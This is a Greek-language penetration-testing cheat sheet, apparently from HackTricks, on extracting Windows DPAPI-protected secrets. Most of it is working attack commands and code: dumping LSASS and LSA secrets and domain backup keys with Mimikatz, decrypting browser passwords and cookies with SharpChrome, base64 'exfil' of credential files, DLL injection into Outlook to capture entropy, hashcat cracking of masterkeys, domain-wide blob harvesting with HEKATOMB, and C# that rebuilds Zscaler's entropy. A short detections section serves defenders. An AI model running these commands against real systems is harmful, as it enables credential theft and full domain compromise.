# DPAPI - Εξαγωγή Συνθηματικών

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

Το Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για το **συμμετρικό κρυπτογράφηση ασυμμετρικών ιδιωτικών κλειδιών**, αξιοποιώντας είτε μυστικά χρήστη είτε του συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα στοιχεία σύνδεσης του χρήστη ή, για κρυπτογράφηση συστήματος, από τα μυστικά πιστοποίησης του domain, εξαλείφοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης οι ίδιοι.

Ο πιο συνηθισμένος τρόπος χρήσης του DPAPI είναι μέσω των **`CryptProtectData` και `CryptUnprotectData`** συναρτήσεων, οι οποίες επιτρέπουν σε εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια με τη συνεδρία της διεργασίας που είναι συνδεδεμένη. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή σύστημα που τα κρυπτογράφησε.

Επιπλέον, αυτές οι συναρτήσεις δέχονται επίσης μια παράμετρο **`entropy`** η οποία θα χρησιμοποιηθεί κατά την κρυπτογράφηση και αποκρυπτογράφηση, επομένως, για να αποκρυπτογραφήσετε κάτι που κρυπτογραφήθηκε χρησιμοποιώντας αυτή την παράμετρο, πρέπει να παρέχετε την ίδια τιμή entropy που χρησιμοποιήθηκε κατά την κρυπτογράφηση.

### Δημιουργία κλειδιών χρηστών

Το DPAPI δημιουργεί ένα μοναδικό κλειδί (καλούμενο **`pre-key`**) για κάθε χρήστη βασισμένο στα διαπιστευτήριά του. Αυτό το κλειδί προέρχεται από τον κωδικό πρόσβασης του χρήστη και άλλους παράγοντες και ο αλγόριθμος εξαρτάται από τον τύπο του χρήστη αλλά καταλήγει να είναι SHA1. Για παράδειγμα, για domain users, **εξαρτάται από το NTLM hash του χρήστη**.

Αυτό είναι ιδιαίτερα ενδιαφέρον επειδή αν ένας επιτιθέμενος μπορέσει να αποκτήσει το hash του κωδικού του χρήστη, μπορεί να:

- **Αποκρυπτογραφήσει οποιαδήποτε δεδομένα κρυπτογραφήθηκαν με DPAPI** χρησιμοποιώντας το κλειδί αυτού του χρήστη χωρίς να χρειάζεται να επικοινωνήσει με καμία API
- Προσπαθήσει να **σπάσει τον κωδικό** offline προσπαθώντας να δημιουργήσει το έγκυρο DPAPI κλειδί

Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη χρησιμοποιώντας DPAPI, δημιουργείται ένα νέο **master key**. Αυτό το master key είναι αυτό που χρησιμοποιείται πραγματικά για να κρυπτογραφήσει τα δεδομένα. Κάθε master key δίνεται με ένα **GUID** (Globally Unique Identifier) που το ταυτοποιεί.

Τα master keys αποθηκεύονται στον φάκελο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου `{SID}` είναι το Security Identifier αυτού του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο από το **`pre-key`** του χρήστη και επίσης από ένα **domain backup key** για ανάκτηση (οπότε το ίδιο κλειδί αποθηκεύεται κρυπτογραφημένο 2 φορές με 2 διαφορετικούς τρόπους).

Σημειώστε ότι το **domain key που χρησιμοποιείται για να κρυπτογραφήσει το master key βρίσκεται στους domain controllers και δεν αλλάζει ποτέ**, οπότε αν ένας επιτιθέμενος έχει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στο domain.

Τα κρυπτογραφημένα blobs περιέχουν το **GUID του master key** που χρησιμοποιήθηκε για να κρυπτογραφήσει τα δεδομένα μέσα στις κεφαλίδες τους.

> [!TIP]
> Τα κρυπτογραφημένα blobs του DPAPI αρχίζουν με **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Αυτό δείχνει πώς φαίνονται μερικά Master Keys ενός χρήστη:

![](<../../images/image (1121).png>)

### Δημιουργία κλειδιού μηχανής/συστήματος

Αυτό είναι το κλειδί που χρησιμοποιείται από τη μηχανή για την κρυπτογράφηση δεδομένων. Βασίζεται στο **DPAPI_SYSTEM LSA secret**, ένα ειδικό κλειδί στο οποίο μπορεί να έχει πρόσβαση μόνο ο χρήστης SYSTEM. Το κλειδί αυτό χρησιμοποιείται για την κρυπτογράφηση δεδομένων που πρέπει να είναι προσβάσιμα από το ίδιο το σύστημα, όπως διαπιστευτήρια σε επίπεδο μηχανής ή μυστικά όλου του συστήματος.

Σημειώστε ότι αυτά τα κλειδιά **δεν έχουν domain backup**, οπότε είναι προσβάσιμα μόνο τοπικά:

- **Mimikatz** μπορεί να το προσπελάσει εξάγοντας τα LSA secrets με την εντολή: `mimikatz lsadump::secrets`
- Το secret αποθηκεύεται στο registry, οπότε ένας administrator θα μπορούσε να **τροποποιήσει τα DACL permissions για να αποκτήσει πρόσβαση**. Η διαδρομή στο registry είναι: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Είναι επίσης δυνατή η offline εξαγωγή από registry hives. Για παράδειγμα, ως administrator στον στόχο, αποθηκεύστε τα hives και εξάγετέ τα:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Στη συνέχεια, στο analysis box σας, ανακτήστε το DPAPI_SYSTEM LSA secret από τα hives και χρησιμοποιήστε το για να αποκρυπτογραφήσετε machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, κ.λπ.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Προστατευμένα δεδομένα από DPAPI

Μεταξύ των προσωπικών δεδομένων που προστατεύονται από το DPAPI είναι:

- Windows creds
- οι κωδικοί πρόσβασης και τα δεδομένα αυτόματης συμπλήρωσης του Internet Explorer και του Google Chrome
- κωδικοί πρόσβασης λογαριασμών e-mail και εσωτερικών FTP για εφαρμογές όπως το Outlook και το Windows Mail
- κωδικοί πρόσβασης για κοινόχρηστους φακέλους, πόρους, ασύρματα δίκτυα και το Windows Vault, συμπεριλαμβανομένων των κλειδιών κρυπτογράφησης
- κωδικοί πρόσβασης για remote desktop connections, .NET Passport, και ιδιωτικά κλειδιά για διάφορους σκοπούς κρυπτογράφησης και πιστοποίησης
- κωδικοί δικτύου που διαχειρίζεται το Credential Manager και προσωπικά δεδομένα σε εφαρμογές που χρησιμοποιούν CryptProtectData, όπως το Skype, το MSN messenger, κ.ά.
- κρυπτογραφημένα blobs μέσα στο register
- ...

Τα δεδομένα που προστατεύονται από το σύστημα περιλαμβάνουν:
- Κωδικοί Wifi
- Κωδικοί προγραμματισμένων εργασιών
- ...

### Επιλογές εξαγωγής master key

- Εάν ο χρήστης έχει domain admin προνόμια, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα user master keys στο domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Με local admin privileges, είναι δυνατό να **έχει κανείς πρόσβαση στη LSASS memory** για να εξαχθούν οι DPAPI master keys όλων των συνδεδεμένων χρηστών και το SYSTEM key.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Εάν ο χρήστης έχει τοπικά δικαιώματα διαχειριστή, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Εάν είναι γνωστός ο κωδικός ή το NTLM hash του χρήστη, μπορείτε να **αποκρυπτογραφήσετε απευθείας τα master keys του χρήστη**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Εάν βρίσκεστε μέσα σε μια συνεδρία ως ο χρήστης, είναι δυνατό να ζητήσετε από τον DC το **backup key to decrypt the master keys using RPC**. Εάν είστε local admin και ο χρήστης είναι συνδεδεμένος, μπορείτε να **steal his session token** για αυτό:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Λίστα Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Πρόσβαση σε DPAPI κρυπτογραφημένα δεδομένα

### Εύρεση DPAPI κρυπτογραφημένων δεδομένων

Τα συνηθισμένα **αρχεία χρηστών που προστατεύονται** βρίσκονται σε:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Επίσης ελέγξτε την αλλαγή του `\Roaming\` σε `\Local\` στις παραπάνω διαδρομές.

Παραδείγματα enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να εντοπίσει DPAPI κρυπτογραφημένα blobs στο file system, registry και B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Σημειώστε ότι [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο repo) μπορεί να χρησιμοποιηθεί για αποκρυπτογράφηση με χρήση του DPAPI ευαίσθητων δεδομένων όπως τα cookies.

#### Chromium/Edge/Electron γρήγορες συνταγές (SharpChrome)

- Τρέχων χρήστης, διαδραστική αποκρυπτογράφηση αποθηκευμένων logins/cookies (λειτουργεί ακόμα και με Chrome 127+ app-bound cookies γιατί το επιπλέον κλειδί επιλύεται από το Credential Manager του χρήστη όταν εκτελείται σε user context):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Ανάλυση εκτός σύνδεσης όταν έχετε μόνο αρχεία. Πρώτα εξάγετε το AES state key από το προφίλ "Local State" και μετά χρησιμοποιήστε το για να αποκρυπτογραφήσετε το cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Σε ολόκληρο το domain/απομακρυσμένο triage όταν έχετε το DPAPI domain backup key (PVK) και admin στον target host:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Αν έχετε το DPAPI prekey/credkey ενός χρήστη (από LSASS), μπορείτε να παραλείψετε το password cracking και να decrypt απευθείας τα profile data:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notes
- Νεότερες εκδόσεις Chrome/Edge ενδέχεται να αποθηκεύουν ορισμένα cookies χρησιμοποιώντας την κρυπτογράφηση "App-Bound". Η αποκρυπτογράφηση εκτός σύνδεσης αυτών των συγκεκριμένων cookies δεν είναι δυνατή χωρίς το επιπλέον app-bound key· τρέξτε το SharpChrome στο περιβάλλον του στοχευόμενου χρήστη για να το ανακτήσει αυτόματα. Δείτε την ανάρτηση στο blog ασφάλειας του Chrome που αναφέρεται παρακάτω.

### Κλειδιά πρόσβασης και δεδομένα

- **Use SharpDPAPI** για να λάβετε διαπιστευτήρια από αρχεία κρυπτογραφημένα με DPAPI από την τρέχουσα συνεδρία:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Get credentials info** όπως τα encrypted data και το guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Πρόσβαση σε masterkeys**:

Αποκρυπτογραφήστε το masterkey ενός χρήστη που ζητάει το **domain backup key** χρησιμοποιώντας RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για την αποκρυπτογράφηση του masterkey (σημειώστε πώς είναι δυνατόν να χρησιμοποιήσετε το `/rpc` για να λάβετε το domains backup key, το `/password` για να χρησιμοποιήσετε ένα plaintext password, ή το `/pvk` για να καθορίσετε ένα αρχείο DPAPI domain private key...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Αποκρυπτογραφήστε δεδομένα χρησιμοποιώντας masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα ορίσματα για αποκρυπτογράφηση των `credentials|vaults|rdg|keepass|triage|blob|ps` (παρατήρησε πως είναι δυνατό να χρησιμοποιήσεις `/rpc` για να πάρεις το backup key του domain, `/password` για να χρησιμοποιήσεις ένα plaintext password, `/pvk` για να καθορίσεις ένα DPAPI domain private key file, `/unprotect` για να χρησιμοποιήσεις την τρέχουσα συνεδρία χρήστη...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Χρήση DPAPI prekey/credkey απευθείας (no password needed)

Αν μπορείτε να dump το LSASS, το Mimikatz συχνά αποκαλύπτει ένα per-logon DPAPI key που μπορεί να χρησιμοποιηθεί για να αποκρυπτογραφήσει τα masterkeys του χρήστη χωρίς να γνωρίζετε το plaintext password. Περνάτε αυτήν την τιμή απευθείας στο tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Αποκρυπτογραφήστε κάποια δεδομένα χρησιμοποιώντας τη **τρέχουσα συνεδρία χρήστη**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Αποκρυπτογράφηση εκτός σύνδεσης με Impacket dpapi.py

Εάν έχετε το SID του χρήστη-θύματος και τον κωδικό πρόσβασης (ή το NT hash), μπορείτε να αποκρυπτογραφήσετε τα DPAPI masterkeys και τα Credential Manager blobs εντελώς εκτός σύνδεσης χρησιμοποιώντας το Impacket’s dpapi.py.

- Εντοπίστε στοιχεία στο δίσκο:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Εάν τα εργαλεία μεταφοράς αρχείων είναι ασταθή, κάντε base64 τα αρχεία στον host και αντιγράψτε την έξοδο:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Αποκρυπτογραφήστε το masterkey με το SID του χρήστη και το password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Χρησιμοποιήστε το αποκρυπτογραφημένο masterkey για να αποκρυπτογραφήσετε το credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Αυτό το workflow συχνά ανακτά domain credentials που έχουν αποθηκευτεί από εφαρμογές που χρησιμοποιούν το Windows Credential Manager, συμπεριλαμβανομένων διαχειριστικών λογαριασμών (π.χ., `*_adm`).

---

### Διαχείριση Προαιρετικού entropy ("Third-party entropy")

Κάποιες εφαρμογές περνούν μια επιπλέον τιμή **entropy** στο `CryptProtectData`. Χωρίς αυτή την τιμή το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμα κι αν είναι γνωστό το σωστό masterkey. Επομένως, η απόκτηση του entropy είναι ζωτικής σημασίας όταν στοχεύουμε credentials που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, μερικοί VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που κάνει hook στις DPAPI συναρτήσεις μέσα στη στοχευόμενη διεργασία και καταγράφει διαφανώς οποιοδήποτε προαιρετικό entropy παρέχεται. Η εκτέλεση του EntropyCapture σε **DLL-injection** mode ενάντια σε διεργασίες όπως `outlook.exe` ή `vpnclient.exe` θα δημιουργήσει ένα αρχείο που αντιστοιχίζει κάθε entropy buffer με τη διεργασία που το κάλεσε και το blob. Το καταγεγραμμένο entropy μπορεί αργότερα να δοθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) προκειμένου να αποκρυπτογραφηθεί το δεδομένο.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Αποκρυπτογράφηση masterkeys εκτός σύνδεσης (Hashcat & DPAPISnoop)

Η Microsoft εισήγαγε τη μορφή masterkey **context 3** ξεκινώντας με τα Windows 10 v1607 (2016). `hashcat` v6.2.6 (Δεκέμβριος 2023) πρόσθεσε τα hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) και **22102** (context 3), επιτρέποντας GPU-accelerated cracking των κωδικών χρηστών απευθείας από το αρχείο masterkey. Οι επιτιθέμενοι μπορούν επομένως να πραγματοποιήσουν word-list ή brute-force επιθέσεις χωρίς αλληλεπίδραση με το σύστημα-στόχο.

`DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Το εργαλείο μπορεί επίσης να αναλύσει Credential και Vault blobs, να τα αποκρυπτογραφήσει με cracked keys και να εξάγει cleartext passwords.

### Πρόσβαση σε δεδομένα άλλου μηχανήματος

Στα **SharpDPAPI and SharpChrome** μπορείτε να ορίσετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα ενός απομακρυσμένου μηχανήματος. Φυσικά πρέπει να μπορείτε να έχετε πρόσβαση σε αυτό το μηχάνημα και στο παρακάτω παράδειγμα υποτίθεται ότι το **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Άλλα εργαλεία

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον κατάλογο LDAP και την εξαγωγή του domain controller backup key μέσω RPC. Το script θα επιλύσει στη συνέχεια όλες τις IP διευθύνσεις των υπολογιστών και θα εκτελέσει smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να τα αποκρυπτογραφήσει όλα με το domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα υπολογιστών που εξαγάγατε από LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμη και αν δεν τα γνωρίζατε!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί να εξάγει μυστικά προστατευμένα με DPAPI αυτόματα. Η έκδοση 2.x εισήγαγε:

* Παράλληλη συλλογή blobs από εκατοντάδες hosts
* Ανάλυση των **context 3** masterkeys και αυτόματη ενσωμάτωση cracking με Hashcat
* Υποστήριξη για Chrome "App-Bound" encrypted cookies (βλέπε επόμενο τμήμα)
* Έναν νέο **`--snapshot`** τρόπο λειτουργίας για επανειλημμένη polling των endpoints και diff των νεοδημιουργημένων blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας C# parser για αρχεία masterkey/credential/vault που μπορεί να εξάγει σε μορφές Hashcat/JtR και προαιρετικά να εκκινήσει cracking αυτόματα. Υποστηρίζει πλήρως τα μορφότυπα machine και user masterkey μέχρι Windows 11 24H1.


## Συνηθισμένες ανιχνεύσεις

- Πρόσβαση σε αρχεία σε `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και άλλους DPAPI-related καταλόγους.
- Ιδιαίτερα από ένα network share όπως **C$** ή **ADMIN$**.
- Χρήση του **Mimikatz**, **SharpDPAPI** ή παρόμοιων εργαλείων για πρόσβαση στη μνήμη του LSASS ή για dump των masterkeys.
- Event **4662**: *Εκτελέστηκε μια λειτουργία σε ένα αντικείμενο* – μπορεί να συσχετιστεί με πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
- Event **4673/4674** όταν μια διεργασία αιτείται *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ευπάθειες & αλλαγές οικοσυστήματος

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Νοέμβριος 2023). Ένας επιτιθέμενος με πρόσβαση στο δίκτυο μπορούσε να ξεγελάσει ένα domain member ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση user masterkeys. Διορθώθηκε στο cumulative update του Νοεμβρίου 2023 — οι διαχειριστές πρέπει να διασφαλίσουν ότι οι DCs και τα workstations είναι πλήρως patched.
* **Chrome 127 “App-Bound” cookie encryption** (Ιούλιος 2024) αντικατέστησε την παλαιότερη προστασία μόνο με DPAPI με ένα επιπλέον κλειδί αποθηκευμένο στο **Credential Manager** του χρήστη. Η offline αποκρυπτογράφηση των cookies τώρα απαιτεί τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Το SharpChrome v2.3 και το DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον κλειδί όταν τρέχουν με user context.


### Μελέτη περίπτωσης: Zscaler Client Connector – Custom Entropy Derived From SID

Το Zscaler Client Connector αποθηκεύει αρκετά αρχεία ρυθμίσεων κάτω από `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο είναι κρυπτογραφημένο με **DPAPI (Machine scope)** αλλά ο vendor παρέχει **custom entropy** που *υπολογίζεται κατά το runtime* αντί να αποθηκεύεται στο δίσκο.

Η entropy ανακατασκευάζεται από δύο στοιχεία:

1. Ένα hard-coded secret ενσωματωμένο στο `ZSACredentialProvider.dll`.
2. Το **SID** του Windows account στο οποίο ανήκει η ρύθμιση.

Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Επειδή το μυστικό είναι ενσωματωμένο σε μια DLL που μπορεί να διαβαστεί από το δίσκο, **οποιοσδήποτε τοπικός επιτιθέμενος με δικαιώματα SYSTEM μπορεί να αναδημιουργήσει την εντροπία για οποιοδήποτε SID** και να αποκρυπτογραφήσει τα blobs εκτός σύνδεσης:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Η αποκρυπτογράφηση αποκαλύπτει την πλήρη JSON διαμόρφωση, συμπεριλαμβανομένου κάθε **ελέγχου κατάστασης συσκευής** και της αναμενόμενης τιμής του — πληροφορία πολύτιμη όταν επιχειρούνται παρακάμψεις στην πλευρά του πελάτη.

> ΣΥΜΒΟΥΛΗ: τα υπόλοιπα κρυπτογραφημένα αρχεία (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** εντροπία (`16` μηδενικά bytes). Συνεπώς μπορούν να αποκρυπτογραφηθούν απευθείας με `ProtectedData.Unprotect` μόλις αποκτηθούν προνόμια SYSTEM.

## Αναφορές

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
